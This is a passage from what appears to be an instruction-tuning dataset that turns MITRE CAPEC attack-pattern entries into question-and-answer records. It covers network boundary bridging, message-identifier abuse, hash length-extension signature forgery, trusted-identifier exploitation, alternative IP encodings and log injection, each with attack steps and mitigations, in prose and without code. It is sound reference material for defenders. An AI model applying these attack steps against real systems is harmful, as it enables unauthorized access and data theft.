        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify potential targets] An adversary identifies network boundary devices that can be compromised.",
              "Technique": "The adversary traces network traffic to identify which devices the traffic flows through. Additionally, the adversary can identify devices using fingerprinting methods or locating the management page to determine identifying information about the device."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Compromise targets] The adversary must compromise the identified targets in the previous step.",
              "Technique": [
                "Once the device is identified, the adversary can attempt to input known default credentials for the device to gain access to the management console.",
                "Adversaries with sufficient identifying knowledge about the target device can exploit known vulnerabilities in network devices to obtain administrative access."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Bridge Networks] The adversary changes the configuration of the compromised network device to connect the networks the device was segmenting. Depending on the type of network boundary device and its capabilities, bridging can be implemented using various methods.",
              "Technique": [
                "The adversary can abuse Network Address Translation (NAT) in firewalls and routers to manipulate traffic flow to their own design. With control of the network device, the adversary can manipulate NAT by either using existing configurations or creating their own to allow two previously unconnected networks to communicate.",
                "Some network devices can be configured to become a proxy server. Adversaries can set up or exploit an existing proxy server on compromised network devices to create a bridge between separate networks."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have control of a network boundary device."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary must understand how to manage the target network device to create or edit policies which will bridge networks."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires either high privileges or full control of a boundary device on a target network."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": [
                "Read Data",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": [
                "Integrity",
                "Authorization"
              ],
              "Impact": [
                "Alter Execution Logic",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure network devices are storing credentials in encrypted stores",
            "Design: Follow the principle of least privilege and restrict administrative duties to as few accounts as possible. Ensure these privileged accounts are secured with strong credentials which do not overlap with other network devices.",
            "Configuration: When possible, configure network boundary devices to use MFA.",
            "Configuration: Change the default configuration for network devices to harden their security profiles. Default configurations are often enabled with insecure features to allow ease of installation and management. However, these configurations can be easily discovered and exploited by adversaries.",
            "Implementation: Perform integrity checks on audit logs for network device management and review them to identify abnormalities in configurations.",
            "Implementation: Prevent network boundary devices from being physically accessed by unauthorized personnel to prevent tampering."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "In November 2016, a Smart Install Exploitation Tool was released online which takes advantage of Cisco\u2019s unauthenticated SMI management protocol to download a target\u2019s current configuration files. Adversaries can use this tool to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Once the adversary has access to the device\u2019s configurations, they could modify it to redirect network traffic through other network infrastructure."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1599",
            "Entry_Name": "Network Boundary Bridging"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-746"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Date": "2023-01-24"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Choosing Message Identifier (CAPEC ID: 12)",
    "context": "",
    "output": "Examples of Choosing Message Identifier (CAPEC ID: 12) are: A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single \"Partners\" channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Adversaries having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows adversaries without partner status from conducting this attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single \"Partners\" channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Adversaries having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows adversaries without partner status from conducting this attack.",
      "@Name": "Choosing Message Identifier (CAPEC ID: 12)",
      "attack_ptrn": {
        "@ID": "12",
        "@Name": "Choosing Message Identifier",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "This pattern of attack is defined by the selection of messages distributed via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "21"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "216"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Nature of Messages] Determine the nature of messages being transported as well as the identifiers to be used as part of the attack"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Authenticate] If required, authenticate to the distribution channel"
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Identify Known Client Identifiers] If any particular client's information is available through a control channel available to all users, the adversary will discover particular identifiers for targeted clients by observing this channel, or requesting client information through this channel."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Change Message Identifier] Adversaries with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.",
            "Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "All the adversary needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            {
              "xhtml:p": [
                "Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client, or part of a discerning authorization decision for privileged channels/messages.",
                "The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message."
              ]
            },
            "Re-architect system input/output channels as appropriate to distribute self-protecting data. That is, encrypt (or otherwise protect) channels/messages so that only authorized readers can see them."
          ]
        },
        "Example_Instances": {
          "Example": "A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single \"Partners\" channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Adversaries having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows adversaries without partner status from conducting this attack."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "201"
            },
            {
              "@CWE_ID": "306"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Resources_Required, Skills_Required"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Choosing a Message/Channel Identifier on a Public/Multicast Channel"
          }
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Web Services API Signature Forgery Leveraging Hash Function Extension Weakness (CAPEC ID: 461)",
    "context": "",
    "output": "To leverage an attack against the has function extension / padding weakness, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "To leverage an attack against the has function extension / padding weakness, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error.",
      "@Name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness (CAPEC ID: 461)",
      "attack_ptrn": {
        "@ID": "461",
        "@Name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary utilizes a hash function extension/padding weakness, to modify the parameters passed to the web service requesting authentication by generating their own call in order to generate a legitimate signature hash (as described in the notes), without knowledge of the secret token sometimes provided by the web service.",
        "Extended_Description": {
          "xhtml:p": "When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller, when constructing a request, would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, for an adversary to conduct signature forgery by computing the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work on other hash functions such as SHA1."
        },
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "115"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find a vulnerable web service] The adversary finds a web service that uses a vulnerable authentication scheme, where an authentication token is concatenated with the parameters of a request and then hashed",
              "Technique": [
                "Read application documentation to learn about authentication schemes being used",
                "Observe web service traffic to look for vulnerable authentication schemes"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt adding padding to parameters] An adversary tests if they can simply add padding to the parameters of a request such that the request is technically changed, with the hash remaining the same",
              "Technique": "Exploit the hash function extension / padding weakness with only padding to test the weakness"
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Add malicious parameters to request] Add malicious parameters to a captured request in addition to what is already present. Do this by exploiting the padding weakness of the hash function and send the request to the web service so that it believes it is authenticated and acts on the extra parameters.",
              "Technique": "Exploit the hash function extension / padding weakness by adding malicious parameters to a web service request such that it is still deemed authentic"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Web services check the signature of the API calls",
            "Authentication tokens / secrets are shared between the server and the legitimate client",
            "The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.",
            "An iterative hash function like MD5 and SHA1 is used.",
            "An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.",
            "The communication channel between the client and the server is not secured via channel security such as TLS"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Medium level of cryptography knowledge, specifically how iterative hash functions work. This is needed to select proper padding."
          }
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "Access to a function to produce a hash (e.g., MD5, SHA1)",
              "Tools that allow the attacker to intercept a message between the client and the server, specifically the hash that is the signature and the length of the original message concatenated with the secret bytes"
            ]
          }
        },
        "Mitigations": {
          "Mitigation": "Design: Use a secure message authentication code (MAC) function such as an HMAC-SHA1"
        },
        "Example_Instances": {
          "Example": "To leverage an attack against the has function extension / padding weakness, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "328"
            },
            {
              "@CWE_ID": "290"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-398"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Exploitation of Trusted Identifiers (CAPEC ID: 21)",
    "context": "",
    "output": "Possible examples: For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so."
      ],
      "@Name": "Exploitation of Trusted Identifiers (CAPEC ID: 21)",
      "attack_ptrn": {
        "@ID": "21",
        "@Name": "Exploitation of Trusted Identifiers",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary guesses, obtains, or \"rides\" a trusted identifier (e.g. session ID, resource ID, cookie, etc.) to perform authorized actions under the guise of an authenticated user or service."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Attacks leveraging trusted identifiers typically result in the adversary laterally moving within the local network, since users are often allowed to authenticate to systems/applications within the network using the same identifier. This allows the adversary to obtain sensitive data, download/install malware on the system, pose as a legitimate user for social engineering purposes, and more.",
            "Attacks on trusted identifiers take advantage of the fact that some software accepts user input without verifying its authenticity. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes \"trust\" other systems because they are behind a firewall. Similarly, servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Identifiers may be guessed or obtained due to insufficient randomness, poor protection (passed/stored in the clear), lack of integrity (unsigned), or improper correlation with access control policy enforcement points. Exposed configuration and properties files that contain sensitive data may additionally provide an adversary with the information needed to obtain these identifiers. An adversary may also \"ride\" an identifier via a malicious link, as is the case in Cross Site Request Forgery (CSRF) attacks.",
            "Regardless of the attack vector, successful spoofing and impersonation of trusted credentials can lead to an adversary breaking authentication, authorization, and audit controls with the target system or application."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target, the adversary probes for cookies, session tokens, or entry points that bypass identifiers altogether.",
              "Technique": [
                "Spider all available pages",
                "Attack known bad interfaces",
                "Search outward-facing configuration and properties files for identifiers."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Fetch samples] The adversary fetches many samples of identifiers. This may be through legitimate access (logging in, legitimate connections, etc.) or via systematic probing.",
              "Technique": [
                "An adversary makes many anonymous connections and records the session IDs assigned.",
                "An adversary makes authorized connections and records the session tokens or credentials issued.",
                "An adversary gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connection from it, attempting to gain the same privileges as a trusted system."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Server software must rely on weak identifier proof and/or verification schemes.",
            "Identifiers must have long lifetimes and potential for reusability.",
            "Server software must allow concurrent sessions to exist."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user"
          }
        },
        "Resources_Required": {
          "Resource": [
            "Ability to deploy software on network.",
            "Ability to communicate synchronously or asynchronously with server."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.",
            "Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.",
            "Implementation: If the identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.",
            "Implementation: If the web or application server supports it, then encrypting and/or signing the identifier (such as cookie) can protect the ID if intercepted.",
            "Design: Use strong session identifiers that are protected in transit and at rest.",
            "Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.",
            "Implementation: Verify authenticity of all identifiers at runtime."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an adversary to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an adversary to exploit session IDs.",
                "A brute force attack involves an adversary repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an adversary can retry several hundred or thousand request with little to no issue on their side.",
                "The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The adversary can then use these variables and access the application."
              ]
            },
            "For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "6"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "664"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "642"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1134",
              "Entry_Name": "Access Token Manipulation"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1528",
              "Entry_Name": "Steal Application Access Token"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1539",
              "Entry_Name": "Steal Web Session Cookie"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, @Status, Consequences, Description, Example_Instances, Execution_Flow, Mitigations, Prerequisites, Resources_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-11-09",
              "#text": "Exploitation of Session Variables, Resource IDs and other Trusted Credentials"
            },
            {
              "@Date": "2020-07-30",
              "#text": "Exploitation of Trusted Credentials"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Using Alternative IP Address Encodings (CAPEC ID: 4)",
    "context": "",
    "output": "Possible examples: An adversary identifies an application server that applies a security policy based on the domain and application name. For example, the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by using the IP address of the host instead (http://192.168.0.1:8080/application), the application authentication and authorization controls may be bypassed. The adversary relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary identifies an application server that applies a security policy based on the domain and application name. For example, the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by using the IP address of the host instead (http://192.168.0.1:8080/application), the application authentication and authorization controls may be bypassed. The adversary relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.",
      "@Name": "Using Alternative IP Address Encodings (CAPEC ID: 4)",
      "attack_ptrn": {
        "@ID": "4",
        "@Name": "Using Alternative IP Address Encodings",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack relies on the adversary using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "267"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for IP addresses as user input] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application where IP addresses are used.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.",
                "Manually inspect the application to find entry points."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and attempts alternate IP address encodings, observing application behavior. The adversary will also attempt to access the application through an alternate IP address encoding to see if access control changes",
              "Technique": [
                "Instead of using a URL, use the IP address that the URL resolves to",
                "Specify a port directly to a URL input",
                "Omit or add \"http://\" or \"https://\" to a URL to see if the application behaves differently"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Bypass access control] Using an alternate IP address encoding, the adversary will either access the application or give the alternate encoding as input, bypassing access control restrictions."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target software must fail to anticipate all of the possible valid encodings of an IP/web address.",
            "The adversary must have the ability to communicate with the server."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary has only to try IP address format combinations."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Default deny access control policies",
            "Design: Input validation routines should check and enforce both input data types and content against a positive specification. In regards to IP addresses, this should include the authorized manner for the application to represent IP addresses and not accept user specified IP addresses and IP address formats (such as ranges)",
            "Implementation: Perform input validation for all remote content."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary identifies an application server that applies a security policy based on the domain and application name. For example, the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by using the IP address of the host instead (http://192.168.0.1:8080/application), the application authentication and authorization controls may be bypassed. The adversary relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "291"
            },
            {
              "@CWE_ID": "173"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Log Injection-Tampering-Forging (CAPEC ID: 93)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Log Injection-Tampering-Forging (CAPEC ID: 93) are: Dave Nielsen and Patrick Breitenbach PayPal Web Services (aka PHP Toolkit) 0.50, and possibly earlier versions, allows remote attackers to enter false payment entries into the log file via HTTP POST requests to ipn_success.php. See also: CVE-2006-0201",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Dave Nielsen and Patrick Breitenbach PayPal Web Services (aka PHP Toolkit) 0.50, and possibly earlier versions, allows remote attackers to enter false payment entries into the log file via HTTP POST requests to ipn_success.php. See also: CVE-2006-0201"
      ],
      "@Name": "Log Injection-Tampering-Forging (CAPEC ID: 93)",
      "attack_ptrn": {
        "@ID": "93",
        "@Name": "Log Injection-Tampering-Forging",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing them to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "268",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "592"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Application's Log File Format] The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.",
              "Technique": [
